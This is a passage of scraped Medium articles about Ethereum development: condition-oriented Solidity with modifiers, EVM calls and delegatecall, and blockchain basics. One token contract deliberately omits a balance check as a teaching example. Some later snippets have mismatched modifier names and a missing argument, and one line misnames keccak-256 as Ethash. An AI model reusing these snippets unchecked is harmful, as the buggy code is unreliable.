conditional (and thus the state it projects onto) means one thing when in fact it means something subtly different.A single-level conditional is bad enough, but when multi-level conditionals are introduced, the complexity (i.e. the paths which the programmer must consider in all states of the world) increases exponentially and it quickly becomes impossible to reason about the entire contract\u2019s state transitions without formal tools not generally available.COP addresses this by requiring the programmer to explicitly enumerate all such conditionals. Logic becomes flattened into non-conditional state-transactions. The condition fragments can then be properly documented, reused, reasoned-about and attributed with requirements and implications. Essentially, COP uses pre-conditions as a first-class citizen in programming.How it worksIf you have already used Solidity, the chances are that you inadvertently flirted with COP already. Let\u2019s look at a simple token contract:contract Token {    // The balance of everyone    mapping (address => uint) public balances;    // Constructor - we're a millionaire!    function Token() {        balances[msg.sender] = 1000000;    }    // Transfer `_amount` tokens of ours to `_dest`.    function transfer(uint _amount, address _dest) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;    }}The astute reader will realise there is a bug here: the transfer function doesn\u2019t ensure that the sender has enough in their account. The normal imperative-language fix for this would be to introduce a conditional into the body:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] >= _amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;    }}Or perhaps:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] < _amount)        return;    balances[msg.sender] -= _amount;    balances[_dest] += _amount;}However both of these solutions rather miss the point of COP; we\u2019re muddling the implementation (which ever one we choose) with the meaning, which remains the same in both cases: that the executing account msg.sender, should have a balance of at least _amount. As a COP coder, we understand this problem perfectly since both solutions break our fundamental rule:Function bodies should have no conditional paths.So in COP, we rather abstract the condition (balances[msg.sender] >= _amount) and create a function modifier:modifier only_with_at_least(uint x) {    if (balances[msg.sender] >= x) _}This piece of code fundamentally abstracts the notion of \u201cexecuting account has a balance of at least some particular amount\u201d. With it in place, we no longer need to think in terms of conditionals, and most importantly, we don\u2019t need to mix pre-condition logic with state-transition logic. This allows a far greater scope for human-understandable analysis of state-transitions.Here\u2019s the new transfer function:function transfer(uint _amount, address _dest)only_with_at_least(_amount) {    balances[msg.sender] -= _amount;    balances[_dest] += _amount;}Abstraction and ReuseSuppose we have another function, which allows anyone with a balance more than 1000 to vote on some issue. We\u2019ll assume for now that voting is just a case of setting the value of an address-indexed mapping.In our old scheme of things, we\u2019d have a function like this:function vote(uint _opinion) {    if (balances[msg.sender] >= 1000) {        votes[msg.sender] = _opinion;    }}Added to our old codebase, we would now have two similar-meaning conditionals. In principle, we would like to have only one such conditional, audited and documented once but used twice. With COP that\u2019s exactly what we do:function vote(uint _opinion) only_when_at_least(1000) {    votes[msg.sender] = _opinion;}This makes our vote function substantially more readable and allows us to reuse important guard-logic, minimising our potential attack surface.More complex transitionsBy discouraging conditional paths from our state-transitions, we limit the complexity of our state-transitions. This hugely helps with auditing since it allows us apply the divide and conquer strategy to program logic analysis and independently check the logic of state transitions from the conditional logic on which they are gated. However sometimes the state transition itself includes gated logic internally.Following on the voting example, suppose we extend the transfer function so that we ensure that any new, reduced, balance has no vote.In the traditional, imperative, way we would simply place a conditional near the balance reduction code:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] >= _amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;        if (balances[msg.sender] < 1000) {            votes[msg.sender] = 0;    // Clear their vote.        }    }}This rather goes against the grain of COP. However we cannot address this directly with a new function modifier since there is no obvious function to modify; we actually wish to place the guard within an internal scope of transfer. In this case (at least with Solidity), we rather create a new (inline) function:function clear_undeserved_vote(account _who)only_with_under(1000)only_when_voted {    delete votes[_who];}Note inline is not yet available in Solidity; we would use it here whenever it be available. This function relies on two modifiers which are easily coded (and audited):modifier only_with_under(uint x) { if (balances[msg.sender] < x) _ }modifier only_when_voted { if (votes[msg.sender] != 0) _ }We can then use this function within our transfer function:function transfer(uint _amount, address _dest)only_with_at_least(_amount) {    balances[msg.sender] -= _amount;    balances[_dest] += _amount;    clear_undeserved_vote();}ConclusionThe main part of our final contract has changed from:contract Token{    //...    function transfer(uint _amount, address _dest) {        if (balances[msg.sender] >= _amount) {            balances[msg.sender] -= _amount;            balances[_dest] += _amount;            if (balances[msg.sender] < 1000) {                votes[msg.sender] = 0;    // Clear their vote.            }        }    }    function vote(uint _opinion) {        if (balances[msg.sender] >= 1000) {            votes[msg.sender] = _opinion;        }    }}To the new:contract Token{    //...    modifier only_with_at_least(uint x) {        if (balances[msg.sender] >= x) _    }    modifier only_with_under(uint x) {        if (balances[msg.sender] < x) _    }    modifier only_when_voted {        if (votes[msg.sender] != 0) _    }    function clear_undeserved_vote(account _who)    only_with_under(1000) only_when_voted {        delete votes[_who];    }    function transfer(uint _amount, address _dest)    only_with_at_least(_amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;        clear_undeserved_vote();    }    function vote(uint _opinion)    only_when_at_least(1000) {        votes[msg.sender] = _opinion;    }}The code we have is somewhat longer, however it has now forced the coder to document the internals, encouraging them to place weight on considering the conditions in isolation and abstracts the important parts to ensure that no copy/paste bugs creep in. The execution structure is flat, easing the conceptual baggage that the auditor must consider. It can be documented and audited, piece-by-piece in a comprehensive and methodical fashion. And, even if left undocumented, it is far more comprehensible, with the named conditions over the original version which muddles them into the transition logic.Being rather verbose, COP certainly won\u2019t be to everyone\u2019s taste. And without certain language support, it can become somewhat unwieldy with large contracts. However, for small and medium-size contracts it provides the programmer and auditor with a clear path to enlightenment that can otherwise be difficult to attain.In the next article in this series I\u2019ll take a \u201creal-world\u201d contract, coded in COP style, and show how it can be broken down, documented and informally demonstrated to be correct.", "responses": 18, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts"]}, {"title": "Getting started with Smart Contracts", "post_link": "https://medium.com/hackernoon/getting-started-with-smart-contracts-3085611c95de?source=search_post", "author_name": "Vamshi Vangapally", "author_link": "https://medium.com/@vvkr", "publish_date": "2017-07-24", "last_modified_date": "2018-06-18", "readtime": "1.02", "claps": 547, "voters": 111, "content": "Getting started with Smart ContractsVamshi VangapallyFollowJul 24, 2017 \u00b7 2 min readI am primarily a JS developer with an aesthetic sense and major focus on building an end to end product.Having ventured into the area of blockchain and smart contracts without any help, struggled a bit on finding right resources which are relevant and understandable by a front-end developer(javascript and related world).If you are completely new and want to know what a smart contract is, you might have to read through this. Once you know what is it and want to go ahead and create one, you can follow the stuff below.In this journey, I\u2019ve managed to create a sequence of resources to be followed to avoid randomness(which I\u2019ve been through).Pre gyan session:A 101 Noob Intro to Programming Smart Contracts on EthereumSome general gyan before you start:Getting Started as an Ethereum Web DeveloperSequence of articles I\u2019ve followedHow to deploy the smart contractHow to build your first \u00d0app through web3.jsA simple smart contract Web UI using web3.jsHyper-ledger Fabric and It\u2019s purposesIn general, if you want to choose a side or entrepreneur or developer or a middleman* The ultimate Ethereum blockchain startup guideSmart Contracts - Hacker NoonRead writing about Smart Contracts in Hacker Noon. how hackers start their afternoons.hackernoon.com", "responses": 1, "tags": ["Ethereum", "Smart Contracts", "Blockchain", "Solidity", "JavaScript"]}, {"title": "Ethereum in Depth, Part 1", "post_link": "https://medium.com/zeppelin-blog/ethereum-in-depth-part-1-968981e6f833?source=search_post", "author_name": "Facu Spagnuolo", "author_link": "https://medium.com/@facuspagnuolo", "publish_date": "2018-05-11", "last_modified_date": "2019-02-13", "readtime": "9.72", "claps": 740, "voters": 109, "content": "Ethereum in Depth, Part 1Facu SpagnuoloFollowMay 11, 2018 \u00b7 10 min readPhoto by Bryn Parish on Unsplash.Welcome to the first part of a two-posts series aimed at software developers looking to understand how the EVM works. The idea is to explain and describe in detail core behavior of the EVM. We will see how contracts are created, how message calls work, and take a look at everything related to data management, such as storage, memory, calldata, and the stack.To better understand this article, you should be familiar with the basics of the EVM. If you are not, I highly recommend reading these posts first.Throughout this post we will illustrate some examples and demonstrations using sample contracts you can find in this repository. Please clone it, run npm install, and check it out before beginning.Enjoy, and please do not hesitate to reach out with questions, suggestions or feedback.Ethereum ContractsBasicsSmart contracts are just computer programs, and we can say that Ethereum contracts are smart contracts that run on the Ethereum Virtual Machine. The EVM is the sandboxed runtime and a completely isolated environment for smart contracts in Ethereum. This means that every smart contract running inside the EVM has no access to the network, file system, or other processes running on the computer hosting the VM.As we already know, there are two kinds of accounts: contracts and external accounts. Every account is identified by an address, and all accounts share the same address space. The EVM handles addresses of 160-bit length. Every account consists of a balance, a nonce, bytecode, and stored data (storage). However, there are some differences between these two kinds of accounts. For instance, the code and storage of external accounts are empty, while contract accounts store their bytecode and the merkle root hash of the entire state tree. Moreover, while external addresses have a corresponding private key, contract accounts don\u2019t. The actions of contract accounts are controlled by the code they host in addition to regular cryptographic signing of every Ethereum transaction.CreationThe creation of a contract is simply a transaction in which the receiver address is empty and its data field contains the compiled bytecode of the contract to be created (this makes sense \u2014 contracts can create contracts too). Let\u2019s look at a quick example. Please open the directory of exercise 1; in it you will find a contract called MyContract with the following code:pragma solidity ^0.4.21;contract MyContract {  event Log(address addr);  function MyContract() public {    emit Log(this);  }  function add(uint256 a, uint256 b) public pure returns (uint256) {    return a + b;  }}Let\u2019s open a truffle console in develop mode running truffle develop. Once inside, follow the subsequent commands to deploy an instance of MyContract:truffle(develop)> compiletruffle(develop)> sender = web3.eth.accounts[0]truffle(develop)> opts = { from: sender, to: null, data: MyContract.bytecode, gas: 4600000 }truffle(develop)> txHash = web3.eth.sendTransaction(opts)We can check that our contract has been deployed successfully by running the following code:truffle(develop)> receipt = web3.eth.getTransactionReceipt(txHash)truffle(develop)> myContract = new MyContract(receipt.contractAddress)truffle(develop)> myContract.add(10, 2){ [String: \u201812\u2019] s: 1, e: 1, c: [ 12 ] }Let\u2019s go deeper to analyze what we just did. The first thing that happens when a new contract is deployed to the Ethereum blockchain is that its account is created.\u00b9 As you can see, we logged the address of the contract in the constructor in the example above. You can confirm this by checking that receipt.logs[0].data is the address of the contract-padded 32 bytes and that receipt.logs[0].topics is the keccak-256 hash of the string \u201cLog(address)\u201d.As the next step, the data sent in with the transaction is executed as bytecode. This will initialize the state variables in storage, and determine the body of the contract being created. This process is executed only once during the lifecycle of a contract. The initialization code is not what is stored in the contract; it actually produces as its return value the bytecode to be stored. Bear in mind that after a contract account has been created, there is no way to change its code.\u00b2Given the fact that the initialization process returns the code of the contract\u2019s body to be stored, it makes sense that this code isn\u2019t reachable from the constructor logic. For example, let\u2019s take a look at the Impossible contract of exercise 1:contract Impossible {  function Impossible() public {    this.test();  }  function test() public pure returns(uint256) {    return 2;  }}If you try to compile this contract, you will get a warning saying you\u2019re referencing this within the constructor function, but it will compile. However, if you try to deploy a new instance, it will revert. This is because it makes no sense to attempt to run code that is not stored yet.\u00b3 On the other hand, we were able to access the address of the contract: the account exists, but it doesn\u2019t have any code yet.However, a code execution can produce other events, such as altering the storage, creating further accounts, or making further message calls. For example, let\u2019s take a look at the AnotherContract code:contract AnotherContract {  MyContract public myContract;  function AnotherContract() public {    myContract = new MyContract();  }}Let\u2019s see how it works running the following commands inside a truffle console:truffle(develop)> compiletruffle(develop)> sender = web3.eth.accounts[0]truffle(develop)> opts = { from: sender, to: null, data: AnotherContract.bytecode, gas: 4600000 }truffle(develop)> txHash = web3.eth.sendTransaction(opts)truffle(develop)> receipt = web3.eth.getTransactionReceipt(txHash)truffle(develop)> anotherContract = AnotherContract.at(receipt.contractAddress)truffle(develop)> anotherContract.myContract().then(a => myContractAddress = a)truffle(develop)> myContract = MyContract.at(myContractAddress)truffle(develop)> myContract.add(10, 2){ [String: \u201812\u2019] s: 1, e: 1, c: [ 12 ] }Additionally, contracts can be created using the CREATE opcode, which is what the Solidity new construct compiles down to. Both alternatives work the same way. Let\u2019s continue exploring how message calls work.Message CallsContracts can call other contracts through message calls. Every time a Solidity contract calls a function of another contract, it does so by producing a message call. Every call has a sender, a recipient, a payload, a value, and an amount of gas. Solidity provides a native call method for the address type that works as follows:address.call.gas(gas).value(value)(data)gas is the amount of gas to be forwarded, address is the address to be called, value is the amount of Ether to be transferred in wei, and data is the payload to be sent. Bear in mind that value and gas are optional parameters here, but be careful because almost all the remaining gas of the sender will be sent by default in a low-level call.As you can see, each contract can decide the amount of gas to be forwarded in a call. Given that every call can end in an out-of-gas (OOG) exception, to avoid security issues at least 1/64th of the sender\u2019s remaining gas will be saved. This allows senders to handle inner calls\u2019 out-of-gas errors, so that they are able to finish its execution without themselves running out of gas, and thus bubbling the exception up.Let\u2019s take a look at the Caller contract of exercise 2:contract Implementation {  event ImplementationLog(uint256 gas);  function() public payable {    emit ImplementationLog(gasleft());    assert(false);  }}contract Caller {  event CallerLog(uint256 gas);  Implementation public implementation;    function Caller() public {    implementation = new Implementation();  }function () public payable {    emit CallerLog(gasleft());    implementation.call.gas(gasleft()).value(msg.value)(msg.data);    emit CallerLog(gasleft());  }}The Caller contract has only a fallback function that redirects every received call to an instance of Implementation. This instance simply throws through an assert(false) on every received call, which will consume all the gas given. Then, the idea here is to log the amount of gas in Caller before and right after forwarding a call to Implementation. Let\u2019s open a truffle console and see what happens:truffle(develop)> compiletruffle(develop)> Caller.new().then(i => caller = i)truffle(develop)> opts = { gas: 4600000 }truffle(develop)> caller.sendTransaction(opts).then(r => result = r)truffle(develop)> logs = result.receipt.logstruffle(develop)> parseInt(logs[0].data) //4578955truffle(develop)> parseInt(logs[1].data) //71495As you can see, 71495 is approximately the 64th part of 4578955. This example clearly demonstrates that we can handle an OOG exception from an inner call.Solidity also provides the following opcode, allowing us to manage calls with inline assembly:call(g, a, v, in, insize, out, outsize)Where g is the amount of gas to be forwarded, a is the address to be called, v is the amount of Ether to be transferred in wei, in states the memory position of insize bytes where the call data is held, and out and outsize state where the return data will be stored in memory. The only difference is that an assembly call allows us to handle return data, while the function will only return 1 or 0 whether it failed or not.The EVM supports a special variant of a message call called delegatecall. Once again, Solidity provides a built-in address method in addition to an inline assembly version of it. The difference with a low-level call is that the target code is executed within the context of the calling contract, and msg.sender and msg.value do not change.\u2074Let\u2019s analyze the following example to understand better how a delegatecall works. Let\u2019s start with the Greeter contract:contract Greeter {  event Thanks(address sender, uint256 value);  function thanks() public payable {    emit Thanks(msg.sender, msg.value);  }}As you can see, the Greeter contract simply declares a thanks function that emits an event carrying the msg.value and msg.sender data. We can try this method by running the following lines in a truffle console:truffle(develop)> compiletruffle(develop)> someone = web3.eth.accounts[0]truffle(develop)> ETH_2 = new web3.BigNumber(\u20182e18\u2019)truffle(develop)> Greeter.new().then(i => greeter = i)truffle(develop)> opts = { from: someone, value: ETH_2 }truffle(develop)> greeter.thanks(opts).then(tx => log = tx.logs[0])truffle(develop)> log.event                     //Thankstruffle(develop)> log.args.sender === someone   //truetruffle(develop)> log.args.value.eq(ETH_2)      //trueNow that we have confirmed its functionality, let\u2019s pay attention to the Wallet contract:contract Wallet {  Greeter internal greeter;    function Wallet() public {    greeter = new Greeter();  }    function () public payable {    bytes4 methodId = Greeter(0).thanks.selector;    require(greeter.delegatecall(methodId));  }}This contract only defines a fallback function that executes the Greeter#thanks method through a delegatecall. Let\u2019s see what happens when we call Greeter#thanks through the Wallet contract:truffle(develop)> Wallet.new().then(i => wallet = i)truffle(develop)> wallet.sendTransaction(opts).then(r => tx = r)truffle(develop)> logs = tx.receipt.logstruffle(develop)> SolidityEvent = require(\u2018web3/lib/web3/event.js\u2019)truffle(develop)> Thanks = Object.values(Greeter.events)[0]truffle(develop)> event = new SolidityEvent(null, Thanks, 0)truffle(develop)> log = event.decode(logs[0])truffle(develop)> log.event                    // Thankstruffle(develop)> log.args.sender === someone  // truetruffle(develop)> log.args.value.eq(ETH_2)     // trueAs you may have noticed, we have just confirmed that the delegatecall function preserves the msg.value and msg.sender .This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address. This makes it possible to implement the \u2018library\u2019 feature in Solidity.\u201d \u2075There is one more thing we should explore about delegatecalls. As mentioned above, the storage of the calling contract is the one being accessed by the executed code. Let\u2019s see the Calculator contract:contract ResultStorage {  uint256 public result;}contract Calculator is ResultStorage {  Product internal product;  Addition internal addition;  function Calculator() public {    product = new Product();    addition = new Addition();  }    function add(uint256 x) public {    bytes4 methodId = Addition(0).calculate.selector;    require(addition.delegatecall(methodId, x));  }  function mul(uint256 x) public {    bytes4 methodId = Product(0).calculate.selector;    require(product.delegatecall(methodId, x));  }}contract Addition is ResultStorage {  function calculate(uint256 x) public returns (uint256) {    uint256 temp = result + x;    assert(temp >= result);    result = temp;    return result;  }}contract Product is ResultStorage {  function calculate(uint256 x) public returns (uint256) {    if (x == 0) result = 0;    else {      uint256 temp = result * x;      assert(temp / result == x);      result = temp;    }    return result;  }}The Calculator contract has just two functions: add and product. The Calculator contract doesn\u2019t know how to add or multiply; it delegates those calls to the Addition and Product contracts respectively instead. However, all these contracts share the same state variable result to store the result of each calculation. Let\u2019s see how this works:truffle(develop)> Calculator.new().then(i => calculator = i)truffle(develop)> calculator.addition().then(a => additionAddress=a)truffle(develop)> addition = Addition.at(additionAddress)truffle(develop)> calculator.product().then(a => productAddress = a)truffle(develop)> product = Product.at(productAddress)truffle(develop)> calculator.add(5)truffle(develop)> calculator.result().then(r => r.toString()) // 5truffle(develop)> addition.result().then(r => r.toString())   // 0truffle(develop)> product.result().then(r => r.toString())    // 0truffle(develop)> calculator.mul(2)truffle(develop)> calculator.result().then(r => r.toString()) // 10truffle(develop)> addition.result().then(r => r.toString())   // 0truffle(develop)> product.result().then(r => r.toString())    // 0We have just confirmed that we are using the storage of the Calculator contract. Besides that, the code being executed is stored in the Addition and in the Product contracts.Additionally, as for the call function, there is a Solidity assembly opcode version for delegatecall. Let\u2019s take a look at the Delegator contract to see how we can use it:contract Implementation {  event ImplementationLog(uint256 gas);function() public payable {    emit ImplementationLog(gasleft());    assert(false);  }}contract Delegator {  event DelegatorLog(uint256 gas);  Implementation public implementation;  function Delegator() public {    implementation = new Implementation();  }  function () public payable {    emit DelegatorLog(gasleft());    address _impl = implementation;    assembly {     let ptr := mload(0x40)     calldatacopy(ptr, 0, calldatasize)     let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)    }       emit DelegatorLog(gasleft());  }}This time we are using inline assembly to execute the delegatecall. As you may have noticed, there is no value argument here, since msg.value will not change. You may be wondering why we are loading the 0x40 address, or what calldatacopy and calldatasize are. Don\u2019t panic \u2014 we will describe them in the next post of the series. In the meantime, feel free to run the same commands over a truffle console to validate its behavior.Once again, it\u2019s important to understand clearly how a delegatecall works. Every triggered call will be sent from the current contract and not the delegate-called contract. Additionally, the executed code can read and write to the storage of the caller contract. You can view this as a cliffhanger for the next post, in which storage will be described in more detail.Thank you for reading this post! We have learned more in-depth details about how smart contracts work in the Ethereum world. Please remember that questions, feedback, and suggestions are welcome! If you liked the post, stay tuned for the second part focused on data management!Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80\u00b9 \u201cThe address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce.\u201d (Ethereum Yellow Paper)\u00b2 One of the pillars of zeppelin_os is contract upgradeability. At Zeppelin, we\u2019ve been exploring different strategies to implement this. You can read more about this here.\u00b3 Solidity will check before calling an external function that the address has bytecode in it, and otherwise revert.\u2074 This is the main strategy being used these days to build upgradeable contracts.\u2075 Solidity 0.4.23 official documentation.", "responses": 4, "tags": ["Ethereum", "Solidity", "Evm", "Smart Contracts", "Guides"]}, {"title": "A Complete Mental Model for Ethereum dApp Development", "post_link": "https://medium.com/heartbankacademy/a-complete-mental-model-for-ethereum-dapp-development-5ce08598ed0a?source=search_post", "author_name": "Thon Ly", "author_link": "https://medium.com/@thonly", "publish_date": "2018-09-28", "last_modified_date": "2018-10-26", "readtime": "32.2", "claps": 635, "voters": 108, "content": "A Complete Mental Model for Ethereum dApp DevelopmentBlockchain Application Development for Web DevelopersThon LyFollowSep 28, 2018 \u00b7 33 min readPhoto: https://www.ethereum.org/assetsIntroductionThe prevailing architecture of most web applications is client-server-database. We utilize clients such as laptops, smartphones, and tablets to make requests from and submit requests to backend servers, which in turn communicate with databases to persist and retrieve data. The relationship between client and server/database is many-to-one, where control is centralized at the latter. If Web 1.0 is about static web pages, Web 2.0 is about interactivity and JavaScript.web stack: Clients => Servers => DatabasesWhere we want to go is Web 3.0, where servers and databases are as decentralized as the clients. In other words, clients can also act as servers or databases or both (aka, peer-to-peer). With many-to-many relationships at all levels of the stack, there are no concentrations of control and a single point of failure. The network is maximally distributed.Web 1.0 Static (HTML/CSS)Web 2.0Interactive (JavaScript)Web 3.0Decentralized (Blockchain)Why do we want clients to also maintain the databases? The most obvious and powerful use-case is Bitcoin. If we all collectively maintain a public ledger of balances and transactions, we can create a global currency that\u2019s completely divorced from governments and institutions. With prophetic timing, \u201cSatoshi Nakamoto\u201d mined the first bitcoin on January 3, 2009 at the height of the worst financial crisis since the Great Depression.blockchain => public ledger => global currencySoon after, Vitalik Buterin realized that if clients could also maintain the \u201cservers\u201d along with the databases, the underlying blockchain can become programmable. The incredible implication is autonomous smart contracts. Such contracts could then be programmed to tokenize (digitize) real-world assets with records of ownership that are immutable. In effect, anyone from any corner of the globe can trade anything, cheaply and securely, without the need for intermediaries which are prone to corruption. From land, energy, music, and voting, the applications are endless, disruptive, and profound.smart contract => records of ownership => blockchainApplications that utilize smart contracts are known as decentralized applications, or dapps for short. Dapps are frontend apps that interface with smart contracts (instead of servers) to persist or retrieve data on the blockchain (instead of databases). Clients interact with dapps through external accounts. To help web developers looking to get into Ethereum dApp development, the author hopes to impart a simple mental model for these architectural layers that make up the blockchain application stack.webapp: Client           => Server         => Databasedapp:   External Account => Smart Contract => BlockchainFor a nontechnical introduction to blockchain, check out this insightful (and quite funny!) primer by Bertie Spell:https://bertiespell.com/blockchain-solves-everythingBlockchain (Database) LayerThe blockchain layer is analogous to the database layer, where data is persisted and retrieved. Here, blocks record every transaction that has ever taken place. What makes blockchain different is that anyone can add to the chain. Consensus is achieved through a process called mining, where computers running an Ethereum client compete to secure the next block (aka, proof-of-work). Together, these nodes make up a network, and each one retains a copy of the entire blockchain. It\u2019s a novel solution to the Byzantine Generals Problem that plagues all distributed systems.network: Ethereum clients => mine(blocks) => proofTo add new data to the blockchain, we submit transactions to nodes in the network. Nodes then group pending transactions into blocks before beginning the mining process.node: transactions => blocks => blockchainTo be precise, each block is a Merkle tree of transactions, plus a Merkle tree of receipts and a Merkle tree of the state. The benefit of these Merkle trees (Merkle-Patricia tries to be exact) is a simplified verification process (aka, Merkel proof), where nodes can simply download the block headers instead of every transaction in every block to verify a payment (aka, light clients).Block Header:1) transactions => transactions trie => transactionsRoot2) infos and logs => receipts trie => receiptsRoot3) addresses and balances => state trie => stateRoottransactionsRoot is a trie of transactions in the block, receiptsRoot is a trie of transaction infos and logs, while stateRoot is a trie of account addresses and balances (aka, ledger). Essentially, a transaction is just a state transition, and a smart contract is just a state transition function.transactions: genesis => state 1 => state 2 => ... => state NAnd the underlying data structure is basically a linked list of binary trees of cryptographic hashes.blockchain: genesis <= tries 1 <= tries 2 <= ... <= tries NTo mine a new block, we calculate a hash of these Merkle roots in the block header. This hash must reference the hash of the last block while it computes a special nounce that results in a value less than some target. This mathematical work is \u201cproof\u201d that the block is valid.hash(nounce, block header, previous hash) < targetThe target is set by the Ethash algorithm which takes into account the time it took to solve the previous block such that the average time normalizes to 15 seconds (aka, block time). This target is continually adjusted because the number of people running nodes is not always constant and the quality of computing resources keeps improving. The output hash is a hexademical (base 16, usually prefixed with \u201c0x\u201d) and is always 64 characters long.https://etherscan.io/chart/blocktimeA block time that\u2019s too high (low target value) will slow down the network and increase processing time of transactions. A block time that\u2019s too low (high target value) will create many duplicate solutions, creating forks in the blockchain. A block time of 15 seconds seems to be ideal.low target value => high block time => takes too longhigh target value => low block time => too many forksWhen forks occur, Ethereum follows the GHOST protocol which selects the fork that has done the most \u201cwork\u201d, i.e., the longest chain (highest block number).Fork A: genesis + block 1 + block 2 + ... + block 12 // mainFork B: genesis + block 1 + block 2 + ... + block 11 // uncleFork C: genesis + block 1 + block 2 + ... + block 10 // uncleUnlike Bitcoin, forks in Ethereum are not \u201corphans\u201d and abandoned. They are \u201cuncles\u201d and are rewarded to create an economic incentive that decentralizes mining pools for increased security. Generally, we wait for at least 6 network confirmations to allow the longest chain to win by a wide margin.block reward: 3 + fees + (1/32 x uncles)uncle reward: 7/8 x 3 // 2 uncles per block (maximum)The more mining is centralized, the greater the risk of a 51% attack, where miners collude to validate double spendings. Waiting for at least 6 more blocks to be confirmed by the network also decreases this risk. Either way, such attacks are impractical and unprofitable, costing at least $6 billion to carry out, and even more if we consider the opportunity cost of not acting honestly and receiving rewards in return.Let\u2019s take a look at an actual block of transactions on the Ethereum network:https://etherscan.io/block/5912705The block Height indicates its order in the chain. In this case, it is block number 5,912,705. According to the TimeStamp, this block was mined on July 5, 2018 around 12 AM by Ethermine. This block contains 89 transactions, which amount to 19,290 new bytes of data. Ethermine was the first to determine the correct Nounce that results in a Hash value less than the target Difficulty. As a reward, Ethermine received 3.46486964996 ethers (Block Reward).block reward = coinbase + fees + uncles = 3 + 0.46486964996 + 0Gas represents computational operations required to execute code. The block Gas Limit defines the maximum number of operations all the transactions in the block are allowed to \u201cconsume\u201d. Like Bitcoin\u2019s block size limitation, its purpose is to keep processing time of transactions and propagation time to other nodes low. Unlike Bitcoin, however, it\u2019s not a constant. Miners have the option to adjust this limit by a small factor.block gas limit = 1.5 x 10^6 x \u03c0 \u00b1 1/1024sum(transaction gas limits) < block gas limitAs in Bitcoin, ethers are created whenever miners successfully solve the cryptographic puzzle. This is done simply by incrementing the miner\u2019s account balance by the reward amount (aka, coinbase transaction). In Bitcoin, however, an actual coinbase transaction needs to be issued by the miner.Let\u2019s now take a look at two of those transactions:https://etherscan.io/tx/0xc28ab33c5943d0d593d34d9af1b29971310dac009b88b83d3b2fae5dfdfed327https://etherscan.io/tx/0x0875ed575d905efdbb909020da5f83867aadfa572f4164ff009a94025f4a977eThese two transactions represent the two possible types in Ethereum. We can send ethers to another account (first transaction) or we can send them to a contract account (second transaction).1) external account => external account2) external account => contract account3) contract account => contract account // \"internal\" transactionsBoth transactions tell us the TimeStamp, From, To, and how much ether to send (Value) . They also indicate how much gas was available (Gas Limit), how much was consumed (Gas Used By Txn), and its unit cost (Gas Price). The Nounce here is just a counter to give order to all the transactions being submitted by a particular sender. This is necessary because transactions need to be processed in order to prevent people from spending more than they have. Upon submission, the TxHash is created. It\u2019s the ID of a transaction, which we can use to ping the network to check on the TxReceipt Status of our transaction. If our transaction is meant for a contract account, we can attach Input Data for the contract to consume.Gas Used By Txn < Gas LimitGas Used By Txn x Gas Price = Actual Tx Cost/FeeWhen we submit transactions, we\u2019re asking nodes in the network to process them for us. This requires compute resources, which we pay for in the form of gas. Gas fees not only deter spam, but also halt bad code such as infinite loops. We can specify the amount as well as the price. At the start, the total potential cost will be deducted. Any gas left over will be reimbursed. If we set an insufficient amount, our transaction will revert and we will not be refunded. The more we\u2019re willing to pay per unit of gas, the more priority we will receive. At present, a gas price of 50 gwei ($0.50) has a processing time of 1 minute. Compared to remittance transfers, this speed is incredible and the cost is minuscule.gas price = supply (miners) + demand (external accounts)Quite confusingly, contract accounts also have a nounce with yet another meaning. In these cases, this \u201cnonsensical\u201d number is incremented whenever the contract account creates another contract account.block nounce = solution to the cryptographic puzzleexternal account nounce = number of transactions issuedcontract account nounce = number of contracts createdBefore we conclude this section, let\u2019s examine the makeup of external and contract accounts:Photo: https://etherscan.io/address/0x68b42e44079d1d0a4a037e8c6ecd62c48967e69fhttps://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266dBoth types of accounts can send and receive ethers. Therefore, both have a Balance field to keep track of them. Contract accounts, however, can also store data. Therefore, they have a storage field, and a code field that contains machine instructions on how to manipulate the stored data. In other words, contract accounts are smart contracts that live on the blockchain.contract account = balance + code + storageexternal account = balance + empty + emptyExternal accounts are controlled by private keys (i.e., humans) while contract accounts are controlled by code. A transaction between two external accounts is simply a value transfer. A transaction from an external account to a contract account activates the called account\u2019s code. Contrary to popular belief, smart contracts cannot self-execute. Actions on contract accounts are always initiated by external accounts.external account => transaction => contract account A => \"internal\" transaction => contract account B => ...In Ethereum as in Bitcoin, we can only send ethers; we can never take. Therefore, the security of the From field is paramount. It\u2019s so vital, in fact, that three additional fields are used to determine its validity. They are the v, r, and s. Obviously, if we can spoof any From address, we can manipulate any account to transfer all its ethers to us. To comprehend v, r, and s, we need to understand asymmetric cryptography.transact = send ethers // can never take ethersWe use cryptography to encrypt and decrypt messages. With symmetric cryptography, the same key can be used for both encryption and decryption. With asymmetric cryptography, only the private key can be used for decryption, while anyone can use our public key to encrypt messages that only we can see.// Symmetric Cryptographyencrypt(unencrypted message, key 1) => encrypted messagedecrypt(encrypted message, key 1) => unencrypted message// Asymmetric Cryptographyencrypt(unencrypted message, public key) => encrypted messagedecrypt(encrypted message, private key) => unencrypted messageThis property makes asymmetric cryptography more secure because we have no reason to share our private key with anyone. Another advantage of asymmetric cryptography is the ability to \u201csign\u201d a message with our private key. Then using our public key, anyone can verify that our message and our \u201csignature\u201d match.sign(message, private key) => signatureverify(message, signature, public key) => true/falseIn Ethereum, private keys are random 64 hexadecimal characters. In base 10, they are incredibly large and impossible to guess. From private keys, we can generate public keys using the Elliptic Curve Digital Signature Algorithm (ECDSA) to get 128 hexadecimal characters. To generate account addresses, we hash public keys using Ethash (keccak-256) and drop the first 24 characters to arrive at 40 hexadecimal characters.random(hexadecimal characters) => private key // 64 charactersECDSA(private key) => public key // 128 characterskeccak(public key) => account address // 40 charactersIn Ethereum, r and s are outputs of signing the transaction object with the sender\u2019s private key using ECDSA, while v can be used to compute the originating address.sign(transaction) => r and s (signature)v => public key => account addressTogether, these parameters are the means by which nodes in the network can verify that the transaction in fact originated from the account address in question.verify(transaction, 